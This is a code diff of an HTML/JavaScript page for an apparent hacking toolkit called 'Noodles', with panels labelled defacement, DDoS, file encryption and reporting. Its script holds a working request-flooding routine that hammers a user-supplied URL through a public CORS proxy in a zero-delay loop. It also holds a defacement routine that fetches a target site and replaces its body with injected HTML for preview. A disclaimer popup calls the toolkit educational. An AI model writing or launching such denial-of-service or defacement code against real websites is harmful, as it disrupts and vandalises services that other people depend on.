@@ -7,14 +7,13 @@
     <style>
         body {
             font-family: monospace;
-            background-color: #111; /* Darker background */
+            background-color: #111;
             color: #00ff00;
             margin: 0;
             padding: 0;
-            overflow: hidden; /* Hide scrollbars */
+            overflow: hidden;
         }
 
-        /* Scanlines effect */
         body::before {
             content: "";
             position: fixed;
@@ -63,7 +62,7 @@
             padding: 5px 10px;
             margin: 5px;
             cursor: pointer;
-            transition: background-color 0.3s, color 0.3s; /* Smooth transition */
+            transition: background-color 0.3s, color 0.3s;
         }
 
         button:hover {
@@ -89,7 +88,6 @@
             font-size: 0.8em;
         }
 
-        /* Flowy Sidebar */
         .sidebar {
             position: fixed;
             top: 0;
@@ -113,7 +111,7 @@
             text-align: center;
             cursor: pointer;
             border-bottom: 1px solid #00ff00;
-            transition: background-color 0.3s, color 0.3s; /* Smooth transition */
+            transition: background-color 0.3s, color 0.3s;
         }
 
         .sidebar li:hover {
@@ -122,22 +120,20 @@
         }
 
         .content {
-            margin-left: 220px; /* Width of the sidebar + some spacing */
+            margin-left: 220px;
             padding: 20px;
         }
 
-        /* Logo */
         .logo {
             text-align: center;
             margin-bottom: 20px;
         }
 
         .logo img {
-            width: 150px; /* Adjust size as needed */
+            width: 150px;
             height: auto;
         }
 
-        /* Modal styles */
         .modal {
             display: none;
             position: fixed;
@@ -173,7 +169,6 @@
             text-decoration: none;
             cursor: pointer;
         }
-
     </style>
 </head>
 <body>
@@ -226,6 +221,7 @@
             <p>This tool encrypts files, making them unreadable without the correct key. Use responsibly. <a href="#" onclick="openModal('encryption-info')">Learn more</a></p>
             <input type="file" id="encryption-file">
             <input type="text" id="encryption-key" placeholder="Encryption Key">
+            <button onclick="backupFile()">Backup File</button>
             <button onclick="encryptFile()">Encrypt File</button>
             <p>Decryption Instructions: <span id="decryption-instructions"></span></p>
         </section>
@@ -284,6 +280,7 @@
         <ul>
             <li><b>File Input:</b> Select the file you want to encrypt.</li>
             <li><b>Encryption Key:</b> Enter a strong, unique key to encrypt the file. This key will be required to decrypt the file later.</li>
+            <li><b>Backup File:</b> Back up the original file before encryption.</li>
             <li><b>Encrypt File:</b> Encrypt the file using the provided key and download the encrypted version.</li>
             <li><b>Decryption Instructions:</b> A guide on how to decrypt the file, including the necessary key and tool.</li>
         </ul>
@@ -294,7 +291,218 @@
 <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
 <script>
-    // --- Particles.js Configuration ---
+    console.log("Noodles Initialized");
+
+    if (!confirm("WARNING: This toolkit is for educational and security testing purposes ONLY. Unauthorized use is illegal and Noodles Inc. is NOT responsible. Do you accept the risks? Pressing 'No' will close this site.")) {
+        window.close();
+    }
+
+    function setSecurityHeaders() {
+        console.warn("Security Headers need server-side config.");
+    }
+    setSecurityHeaders();
+
+    function showSection(sectionId) {
+        const sections = ['defacement', 'ddos', 'encryption', 'reporting'];
+        sections.forEach(id => {
+            document.getElementById(id).style.display = 'none';
+        });
+        document.getElementById(sectionId).style.display = 'block';
+        console.log(`Showing section: ${sectionId}`);
+    }
+
+    // Defacement Tool
+    function backupWebsite() {
+        const url = document.getElementById('defacement-url').value;
+        if (!url) {
+            alert("Please enter a URL.");
+            return;
+        }
+        console.log(`Backing up website: ${url}`);
+
+        const corsProxy = 'https://corsproxy.io/?';
+
+        fetch(corsProxy + encodeURIComponent(url))
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
+                return response.text();
+            })
+            .then(html => {
+                const blob = new Blob([html], { type: 'text/html' });
+                const a = document.createElement('a');
+                a.href = URL.createObjectURL(blob);
+                a.download = 'website_backup.html';
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                URL.revokeObjectURL(a.href);
+                console.log('Website backed up successfully.');
+            })
+            .catch(error => {
+                console.error('Error backing up website:', error);
+                alert('Failed to backup website. Check console for details.');
+            });
+    }
+
+    function previewDefacement() {
+        const code = document.getElementById('defacement-code').value;
+        document.getElementById('defacement-preview').innerHTML = code;
+        console.log("Previewing defacement code.");
+    }
+
+    function applyDefacement() {
+        const url = document.getElementById('defacement-url').value;
+        const code = document.getElementById('defacement-code').value;
+        if (!url) {
+            alert("Please enter a URL.");
+            return;
+        }
+        console.warn(`Attempting to deface: ${url} with code (check console).`);
+
+        const corsProxy = 'https://corsproxy.io/?';
+
+        fetch(corsProxy + encodeURIComponent(url))
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
+                return response.text();
+            })
+            .then(html => {
+                const parser = new DOMParser();
+                const doc = parser.parseFromString(html, 'text/html');
+
+                if (doc.body) {
+                    doc.body.innerHTML = code;
+                } else {
+                    console.error('Body element not found.');
+                    alert('Could not apply defacement: Body not found.');
+                    return;
+                }
+
+                const modifiedHtml = new XMLSerializer().serializeToString(doc);
+                document.getElementById('defacement-preview').innerHTML = modifiedHtml;
+                alert('Defacement applied. Preview updated.');
+            })
+            .catch(error => {
+                console.error('Error defacing website:', error);
+                alert('Failed to deface website. Check console.');
+            });
+    }
+
+    // DDoS Tool
+    let ddosInterval;
+    let ddosStartTime;
+
+    function startDDoS() {
+        const url = document.getElementById('ddos-url').value;
+        const threads = parseInt(document.getElementById('ddos-threads').value) || 1;
+        if (!url) {
+            alert("Please enter a URL.");
+            return;
+        }
+
+        ddosStartTime = Date.now();
+        updateDDoSTimer();
+
+        ddosInterval = setInterval(() => {
+            for (let i = 0; i < threads; i++) {
+                const corsProxy = 'https://corsproxy.io/?';
+                fetch(corsProxy + encodeURIComponent(url), { mode: 'no-cors' })
+                    .then(() => console.log(`DDoS: Sent request to ${url}`))
+                    .catch(error => console.error(`DDoS: Error sending request`, error));
+            }
+        }, 0);
+
+        console.warn(`Starting DDoS attack on ${url} with ${threads} threads.`);
+    }
+
+    function stopDDoS() {
+        clearInterval(ddosInterval);
+        console.log("DDoS attack stopped.");
+    }
+
+    function updateDDoSTimer() {
+        if (ddosStartTime) {
+            const elapsedTime = Math.floor((Date.now() - ddosStartTime) / 1000);
+            document.getElementById('ddos-timer').textContent = elapsedTime;
+        }
+
+        if (ddosInterval) {
+            setTimeout(updateDDoSTimer, 1000);
+        }
+    }
+
+    // Encryption Tool
+    function backupFile() {
+        const fileInput = document.getElementById('encryption-file');
+        const file = fileInput.files[0];
+
+        if (!file) {
+            alert("Please select a file.");
+            return;
+        }
+
+        const reader = new FileReader();
+        reader.onload = function(e) {
+            const fileContent = e.target.result;
+            const blob = new Blob([fileContent], { type: 'application/octet-stream' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = file.name + '.bak';
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+
+            console.log("File backed up successfully.");
+        };
+        reader.readAsArrayBuffer(file);
+    }
+
+    function encryptFile() {
+        const fileInput = document.getElementById('encryption-file');
+        const key = document.getElementById('encryption-key').value;
+        const file = fileInput.files[0];
+
+        if (!file || !key) {
+            alert("Select a file and enter an encryption key.");
+            return;
+        }
+
+        const reader = new FileReader();
+        reader.onload = function(e) {
+            const fileContent = e.target.result;
+            const encryptedContent = CryptoJS.AES.encrypt(fileContent, key).toString();
+            const blob = new Blob([encryptedContent], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = file.name + '.enc';
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+
+            console.log("File encrypted and downloaded.");
+            document.getElementById('decryption-instructions').textContent = `To decrypt, use the same key (${key}) and Noodles File Encryption Tool.`;
+        };
+        reader.readAsDataURL(file);
+    }
+
+    // Modal Functions
+    function openModal(modalId) {
+        document.getElementById(modalId).style.display = "block";
+    }
+
+    function closeModal(modalId) {
+        document.getElementById(modalId).style.display = "none";
+    }
+
+    // Init Particles
     particlesJS('particles-js', {
         "particles": {
             "number": {
@@ -313,34 +521,14 @@
                     "width": 0,
                     "color": "#000000"
                 },
-                "polygon": {
-                    "nb_sides": 5
-                },
-                "image": {
-                    "src": "img/github.svg",
-                    "width": 100,
-                    "height": 100
-                }
             },
             "opacity": {
                 "value": 0.5,
                 "random": false,
-                "anim": {
-                    "enable": false,
-                    "speed": 1,
-                    "opacity_min": 0.1,
-                    "sync": false
-                }
             },
             "size": {
                 "value": 5,
                 "random": true,
-                "anim": {
-                    "enable": false,
-                    "speed": 40,
-                    "size_min": 0.1,
-                    "sync": false
-                }
             },
             "line_linked": {
                 "enable": true,
@@ -356,12 +544,6 @@
                 "random": false,
                 "straight": false,
                 "out_mode": "out",
-                "attract": {
-                    "enable": false,
-                    "distance": 200,
-                    "strength": 0.2,
-                    "speed": 1
-                },
                 "bounce": false
             }
         },
@@ -385,239 +567,13 @@
                         "opacity": 1
                     }
                 },
-                "bubble": {
-                    "distance": 400,
-                    "size": 40,
-                    "duration": 2,
-                    "opacity": 0.8,
-                    "speed": 3
-                },
-                "repulse": {
-                    "distance": 200,
-                    "duration": 0.4
-                },
                 "push": {
                     "particles_nb": 4
-                },
-                "remove": {
-                    "particles_nb": 2
                 }
             }
         },
         "retina_detect": true
     });
-
-    console.log("Noodles Initialized");
-
-    // --- Consent Popup ---
-    if (!confirm("WARNING: This toolkit is for educational and security testing purposes ONLY. Unauthorized use is illegal and Noodles Inc. is NOT responsible. Do you accept the risks? Pressing 'No' will close this site.")) {
-        window.close();
-    }
-
-    // --- Security Headers ---
-    function setSecurityHeaders() {
-        // These are server-side settings, not client-side
-        console.warn("Security Headers need to be configured on the server (e.g., Content-Security-Policy, X-Frame-Options)");
-    }
-    setSecurityHeaders();
-
-    // --- Navigation ---
-    function showSection(sectionId) {
-        const sections = ['defacement', 'ddos', 'encryption', 'reporting'];
-        sections.forEach(id => {
-            document.getElementById(id).style.display = 'none';
-        });
-        document.getElementById(sectionId).style.display = 'block';
-        console.log(`Showing section: ${sectionId}`);
-    }
-
-    // --- Defacement Tool Functions ---
-    function backupWebsite() {
-        const url = document.getElementById('defacement-url').value;
-        if (!url) {
-            alert("Please enter a URL.");
-            return;
-        }
-        console.log(`Backing up website: ${url}`);
-
-        // Use a CORS proxy to bypass same-origin policy restrictions
-        const corsProxy = 'https://corsproxy.io/?'; // Or any other CORS proxy
-
-        fetch(corsProxy + encodeURIComponent(url))
-            .then(response => {
-                if (!response.ok) {
-                    throw new Error(`HTTP error! status: ${response.status}`);
-                }
-                return response.text();
-            })
-            .then(html => {
-                // Create a download link for the website content
-                const blob = new Blob([html], { type: 'text/html' });
-                const a = document.createElement('a');
-                a.href = URL.createObjectURL(blob);
-                a.download = 'website_backup.html';
-                document.body.appendChild(a);
-                a.click();
-                document.body.removeChild(a);
-                URL.revokeObjectURL(a.href);
-                console.log('Website backed up successfully.');
-            })
-            .catch(error => {
-                console.error('Error backing up website:', error);
-                alert('Failed to backup website. Check console for details.');
-            });
-    }
-
-
-    function previewDefacement() {
-        const code = document.getElementById('defacement-code').value;
-        document.getElementById('defacement-preview').innerHTML = code;
-        console.log("Previewing defacement code.");
-    }
-
-    function applyDefacement() {
-        const url = document.getElementById('defacement-url').value;
-        const code = document.getElementById('defacement-code').value;
-        if (!url) {
-            alert("Please enter a URL.");
-            return;
-        }
-        console.warn(`Attempting to deface: ${url} with code (check console).`);
-
-        // CORS proxy to bypass same-origin policy
-        const corsProxy = 'https://corsproxy.io/?';
-
-        fetch(corsProxy + encodeURIComponent(url))
-            .then(response => {
-                if (!response.ok) {
-                    throw new Error(`HTTP error! status: ${response.status}`);
-                }
-                return response.text();
-            })
-            .then(html => {
-                const parser = new DOMParser();
-                const doc = parser.parseFromString(html, 'text/html');
-
-                // Inject defacement code into the body
-                if (doc.body) {
-                    doc.body.innerHTML = code;
-                } else {
-                    console.error('Body element not found in the fetched HTML.');
-                    alert('Could not apply defacement: Body element not found.');
-                    return;
-                }
-
-                // Serialize the modified HTML
-                const modifiedHtml = new XMLSerializer().serializeToString(doc);
-
-                // Display the modified HTML (for demonstration purposes)
-                document.getElementById('defacement-preview').innerHTML = modifiedHtml;
-                alert('Defacement applied. Preview updated.');
-            })
-            .catch(error => {
-                console.error('Error defacing website:', error);
-                alert('Failed to deface website. Check console for details.');
-            });
-    }
-
-
-    // --- DDoS Tool Functions ---
-    let ddosInterval;
-    let ddosStartTime;
-
-    function startDDoS() {
-        const url = document.getElementById('ddos-url').value;
-        const threads = parseInt(document.getElementById('ddos-threads').value) || 1;
-        if (!url) {
-            alert("Please enter a URL.");
-            return;
-        }
-
-        ddosStartTime = Date.now();
-        updateDDoSTimer();
-
-        ddosInterval = setInterval(() => {
-            for (let i = 0; i < threads; i++) {
-                // Using a CORS proxy to bypass same-origin policy restrictions
-                const corsProxy = 'https://corsproxy.io/?';
-                fetch(corsProxy + encodeURIComponent(url), { mode: 'no-cors' })
-                    .then(() => console.log(`DDoS: Sent request to ${url}`))
-                    .catch(error => console.error(`DDoS: Error sending request to ${url}`, error));
-            }
-        }, 0); // Send requests as fast as possible
-
-        console.warn(`Starting DDoS attack on ${url} with ${threads} threads (check console).`);
-    }
-
-    function stopDDoS() {
-        clearInterval(ddosInterval);
-        console.log("DDoS attack stopped.");
-    }
-
-    function updateDDoSTimer() {
-        if (ddosStartTime) {
-            const elapsedTime = Math.floor((Date.now() - ddosStartTime) / 1000);
-            document.getElementById('ddos-timer').textContent = elapsedTime;
-        }
-
-        if (ddosInterval) {
-            setTimeout(updateDDoSTimer, 1000);
-        }
-    }
-
-    // --- Encryption Tool Functions ---
-    function encryptFile() {
-        const fileInput = document.getElementById('encryption-file');
-        const key = document.getElementById('encryption-key').value;
-        const file = fileInput.files[0];
-
-        if (!file || !key) {
-            alert("Please select a file and enter an encryption key.");
-            return;
-        }
-
-        const reader = new FileReader();
-        reader.onload = function(e) {
-            const fileContent = e.target.result;
-
-            // Encrypting file content using CryptoJS
-            const encryptedContent = CryptoJS.AES.encrypt(fileContent, key).toString();
-
-            // Saving the encrypted file
-            const blob = new Blob([encryptedContent], { type: 'text/plain' });
-            const url = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = file.name + '.enc';
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
-            URL.revokeObjectURL(url);
-
-            console.log("File encrypted and downloaded.");
-            document.getElementById('decryption-instructions').textContent = `To decrypt this file, use the same key (${key}) and the Noodles File Encryption Tool.`;
-        };
-        reader.readAsDataURL(file);  // Reading as data URL to handle binary files
-    }
-
-    // --- Modal Functions ---
-    function openModal(modalId) {
-        document.getElementById(modalId).style.display = "block";
-    }
-
-    function closeModal(modalId) {
-        document.getElementById(modalId).style.display = "none";
-    }
-
-    // --- Additional Libraries ---
-    function loadScript(url, callback) {
-        const script = document.createElement('script');
-        script.src = url;
-        script.onload = callback;
-        document.head.appendChild(script);
-    }
-
-
 </script>
 
 </body>
